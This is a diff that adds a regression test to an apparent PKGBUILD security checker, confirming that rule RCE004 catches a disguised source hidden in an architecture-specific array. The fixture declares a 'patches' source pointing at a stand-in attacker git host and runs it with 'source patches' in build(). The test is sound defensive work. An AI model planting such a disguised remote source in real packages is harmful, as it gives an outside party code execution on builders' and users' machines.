@@ -136,6 +136,25 @@ def test_rce004_does_not_fire_when_patch_is_applied_normally(make_pkgbuild_ctx):
     assert list(RCE004DisguisedSourceExecuted().check(ctx)) == []
 
 
+def test_rce004_fires_on_disguised_source_hidden_in_architecture_specific_array(make_pkgbuild_ctx):
+    # Regression: a disguised source entry declared only in source_x86_64=()
+    # was invisible to RCE004, since ctx.sources only read the base source=()
+    # array before the architecture-variant merge fix.
+    ctx = make_pkgbuild_ctx(
+        """
+        pkgname=foo
+        arch=('x86_64')
+        source=("foo.tar.gz::https://example.com/foo.tar.gz")
+        source_x86_64=("patches::https://example.invalid/attacker-repo.git")
+        build() {
+          source patches
+        }
+        """
+    )
+    findings = list(RCE004DisguisedSourceExecuted().check(ctx))
+    assert len(findings) == 1
+
+
 def test_rce003_does_not_treat_curl_remote_name_url_as_a_target(make_pkgbuild_ctx):
     # curl's -O (uppercase, no value) derives the local filename from the URL
     # itself -- it must not consume the following URL as if it were an explicit
